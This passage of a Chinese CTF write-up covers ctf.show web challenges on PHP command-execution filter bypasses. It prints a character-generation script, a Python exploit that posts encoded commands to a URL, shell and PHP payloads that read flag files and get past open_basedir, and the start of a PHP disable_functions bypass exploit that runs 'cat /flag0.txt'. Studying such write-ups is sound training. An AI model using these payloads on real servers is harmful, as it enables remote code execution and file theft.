variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span> <span class=\"token operator\">&lt;</span><span class=\"token number\">256</span> <span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t\t<span class=\"token variable\">$hex_i</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token operator\">.</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t<span class=\"token variable\">$hex_i</span><span class=\"token operator\">=</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token variable\">$hex_j</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token operator\">.</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\t<span class=\"token variable\">$hex_j</span><span class=\"token operator\">=</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token variable\">$preg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&amp;|\\-/i'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$preg</span> <span class=\"token punctuation\">,</span> <span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$hex_i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span><span class=\"token class-name\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$preg</span> <span class=\"token punctuation\">,</span> <span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$hex_j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'%'</span><span class=\"token operator\">.</span><span class=\"token variable\">$hex_i</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'%'</span><span class=\"token operator\">.</span><span class=\"token variable\">$hex_j</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">|</span><span class=\"token class-name\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;=</span><span class=\"token number\">32</span><span class=\"token operator\">&amp;</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">126</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\t<span class=\"token variable\">$contents</span><span class=\"token operator\">=</span><span class=\"token variable\">$contents</span><span class=\"token operator\">.</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$a</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$myfile</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$contents</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$myfile</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>大体意思就是 <code>从进行异或的字符中排除掉被过滤的，然后再判断异或得到的字符是否为可见字符</code></p>\n<p>传递参数 <code>getflag</code></p>\n<p>脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> urllib</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> sys <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">\"php rce_or.php\"</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#没有将 php 写入环境变量需手动运行</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"=\"</span><span class=\"token operator\">*</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   \t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'USER：python exp.py &lt;url&gt;'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   \t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"eg：  python exp.py http://ctf.show/\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   \t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"=\"</span><span class=\"token operator\">*</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   \texit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>url<span class=\"token operator\">=</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">action</span><span class=\"token punctuation\">(</span>arg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   \ts1<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   \ts2<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   \t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> arg<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>       \tf<span class=\"token operator\">=</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rce_or.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>       \t<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>           \tt<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>           \t<span class=\"token keyword\">if</span> t<span class=\"token operator\">==</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>               \t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>           \t<span class=\"token keyword\">if</span> t<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>i<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>               \t<span class=\"token comment\">#print(i)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>               \ts1<span class=\"token operator\">+=</span>t<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>               \ts2<span class=\"token operator\">+=</span>t<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>               \t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>       \tf<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>   \toutput<span class=\"token operator\">=</span><span class=\"token string\">\"(\\\"\"</span><span class=\"token operator\">+</span>s1<span class=\"token operator\">+</span><span class=\"token string\">\"\\\"|\\\"\"</span><span class=\"token operator\">+</span>s2<span class=\"token operator\">+</span><span class=\"token string\">\"\\\")\"</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>   \t<span class=\"token keyword\">return</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>   </pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>   \tparam<span class=\"token operator\">=</span>action<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n[+] your function：\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>action<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] your command：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>   \tdata<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>       \t<span class=\"token string\">'c'</span><span class=\"token punctuation\">:</span>urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>unquote<span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>       \t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>   \tr<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>   \t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n[*] result:\\n\"</span><span class=\"token operator\">+</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><pre><code>\t\t\t\t\t\t\t-- 来源于[ yu22x 的博客文章](https://blog.csdn.net/miuzzx/article/details/108569080)\n</code></pre>\n<h2 id=\"web-42\"><a class=\"anchor\" href=\"#web-42\">#</a> web 42</h2>\n<p>双写绕过，分号分隔，分号后面被写入</p>\n<h2 id=\"web-43\"><a class=\"anchor\" href=\"#web-43\">#</a> web 43</h2>\n<p>源码类型同 42，但过滤了分号和 <code>cat</code> ，可以使用 <code>&amp;&amp;</code> , 用来分隔两个命令，如果前一个执行成功第二个不会执行</p>\n<h2 id=\"web-50-51\"><a class=\"anchor\" href=\"#web-50-51\">#</a> web 50、51</h2>\n<p>不用空格的命令</p>\n<p><code>?c=nl&lt;fla''g.php%7C%7Cls</code> ( <code>%7C%7C</code>  为 <code>||</code> ) 其中不用通配符是因为不支持，使用单引号忽略</p>\n<h2 id=\"web-55\"><a class=\"anchor\" href=\"#web-55\">#</a> web 55</h2>\n<p>无字母 RCE</p>\n<p>可以上传文件到服务器上</p>\n<p>在本地制作文件上传表单</p>\n<p>而上传后 php 会把该文件放在一个临时目录下，命名规则为 php+5 位小写字母 + 大写字母，但该文件名不可控，可以使用占位符进行匹配</p>\n<p><code>/???/????????</code>  而如果最后有大写字母，也可以写成 <code>/???/???????[@-[]</code></p>\n<p>如果点号。没有过滤，在 linux 系统里可以使用点号。用来执行脚本文件，即可写 <code>?c=.%20/???/??????[@-[]</code></p>\n<p>然后通过抓包不断修改文件的内容</p>\n<h2 id=\"web-57\"><a class=\"anchor\" href=\"#web-57\">#</a> web 57</h2>\n<p>题目只要构造出 36 即可，而 $ 没有过滤，可以使用 $(()) 进行构造</p>\n<p><code>echo $(())</code>  返回 0，取反后 <code>echo $((~$(())))</code>  即为 - 1，那么我们可以加上 37 个 - 1 再取反</p>\n<p><code>echo ~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))</code></p>\n<p>返回 36</p>\n<h2 id=\"web-62-63-64\"><a class=\"anchor\" href=\"#web-62-63-64\">#</a> web 62、63、64</h2>\n<ol>\n<li><code>include(\"flag.php\");echo $flag;</code></li>\n<li>或者先 include 包含 flag.php，再使用 get_defined_vars (), 获取变量名及值</li>\n<li></li>\n</ol>\n<h2 id=\"web-66\"><a class=\"anchor\" href=\"#web-66\">#</a> web 66</h2>\n<p><code>var_dump(scandir('*'));var_dump(scandir ('/'));</code>  读取相关的目录</p>\n<h2 id=\"web-68\"><a class=\"anchor\" href=\"#web-68\">#</a> web 68</h2>\n<p><code>highlight_file</code>  被禁，用 <code>include</code> ， <code>include ('/flag.txt');</code>  因为没有 php 代码，则直接输出</p>\n<h2 id=\"web-71\"><a class=\"anchor\" href=\"#web-71\">#</a> web 71</h2>\n<p>内容被替换</p>\n<p>思路为提前结束，不执行下面的代码</p>\n<p><code>include('flag.txt');exit();</code></p>\n<h2 id=\"web-72\"><a class=\"anchor\" href=\"#web-72\">#</a> web 72</h2>\n<p><code>var_dump()</code>  被禁</p>\n<p><code>scandir('/')</code>  不能正确读取，因为有了 <code>open_basedir()</code> , 而 <code>ini_set ()</code>  也被禁用，不能修改</p>\n<p>那么可以使用 <code>glob</code>  协议进行绕过</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"glob:///*.txt\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">opendir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">readdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"filename:\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$file</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token function\">closedir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 为了绕过后面的替换内容</span></pre></td></tr></tbody></table></figure><p>虽然知道 flag 的文件名，但是无法读取</p>\n<p>xxxxxxxxxx&nbsp;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>?&gt;<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cat /flag0.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">global</span> <span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$helper</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Vuln</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">global</span> <span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token variable\">$backtrace</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">getTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\"># ;)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'args'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\"># PHP &gt;= 7.4</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                <span class=\"token variable\">$backtrace</span> <span class=\"token operator\">=</span> <span class=\"token function\">debug_backtrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Helper</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$d</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token variable\">$address</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$s</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span> <span class=\"token operator\">&gt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span><span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token variable\">$address</span> <span class=\"token operator\">&lt;&lt;</span><span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token variable\">$address</span> <span class=\"token operator\">|=</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$p</span><span class=\"token operator\">+</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$address</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">ptr2str</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ptr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token variable\">$out</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            <span class=\"token variable\">$out</span> <span class=\"token operator\">.=</span> <span class=\"token function\">sprintf</span><span 